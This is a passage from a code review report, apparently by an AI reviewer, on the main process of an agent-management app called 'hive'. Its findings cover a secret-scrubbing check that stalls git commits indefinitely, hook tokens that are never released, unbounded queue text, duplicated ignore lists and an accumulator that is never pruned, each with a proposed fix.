**File:** `src/main/hive.ts:3269-3298` (`flushCommit`), with `:3242-3252`

**Issue:** `if (!(await this.scrubStagedSecrets(root))) return;` aborts the flush with everything
still staged. That is the right call for one commit, but there is no recovery and no operator
surface: the next mutation re-enters the same loop, re-stages the same file, and aborts again — the
hive's git history stops advancing for as long as the offending file exists, announced only by
`console.warn`. `drainCommitMessages()` has already run by then (`:3272`), so the batched commit
messages for that window are discarded even though nothing was committed.

Combined with WR-08's `rel === null` branch, one agent-created filename is enough to stop the hive
committing for the life of the install.

**Fix:** surface it where the operator will see it (a `hive.appendLog` entry already exists; add a
breaker-style toast or a `hive:hookEvent`-shaped notice), push the drained messages back onto
`pendingCommits` before returning, and bound the wedge — e.g. after N consecutive aborts on the same
path, refuse only that path (`git reset -- <path>` + a `.git/info/exclude` entry) rather than the
whole commit.

---

## Info

### IN-01: `revokeAgent` has no production caller, and `killAll` releases no tokens

**File:** `src/main/hooks.ts:354-358`, `src/main/pty.ts:884-895`

`revokeAgent` is referenced only by `test/net-binding.test.cjs:239`. Meanwhile `killAll()` clears
`this.sessions` without calling `releaseHookToken`, so every live token survives the sweep. It is
harmless *today* only because both call sites (`index.ts:3844` before `app.exit(0)`, and the quit
teardown at `:4356`) end the process — an undocumented coupling that the next caller of `killAll`
will break. Either call `releaseHookToken(s)` in the loop or state the coupling in the doc comment.

### IN-02: `enqueue` accepts unbounded text

**File:** `src/main/delivery.ts:433-482`

`text` and `instruction` are trimmed and length-checked only for emptiness. The queue file is
rewritten whole on every mutation (`saveQueue`, `:388-402`) and the text is typed into a live PTY, so
a multi-megabyte string from any renderer producer is written to disk on every subsequent queue
change. `MAX_QUEUED_PER_AGENT` bounds the count but not the size. One `if (text.length > MAX_TEXT)
return { ok:false, … }` closes it.

### IN-03: `ensureMineIgnore` / `MINE_IGNORE_LINES` exist twice, with different lists

**File:** `src/main/hive.ts:352-368` vs `src/main/memory.ts:47-63`

Two identical function bodies over two different constants — hive's list has 4 entries, memory's has
10 (`.claude/`, `.codex/`, `.pi-agent/`, `.opencode/`, `.crush-data/`, `crush.json`). Both are
append-only so the union eventually lands, but the drift means "what the miner ignores" depends on
which one ran. Keep one, in `src/shared/`.

### IN-04: `costCumulative` is never pruned

**File:** `src/main/hive.ts:2833`, `:2843-2848`

`pruneCostByTask` bounds `costByTask` by card lifetime, but `costCumulative` — keyed by
`agentId\0sessionId` — is only ever inserted into. Every `--resume`, restart and account failover
mints a new session id, so on a long-lived floor it grows for the life of the process. Not a
correctness bug (the map is only read by key), but it is the one accumulator RECORD-03's bound does
not cover, and the comment at `:2827-2831` reads as if it does.

---

_Reviewed: 2026-08-21_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
_Slice: a-main — MAIN-PROCESS / SHARED / PRELOAD_
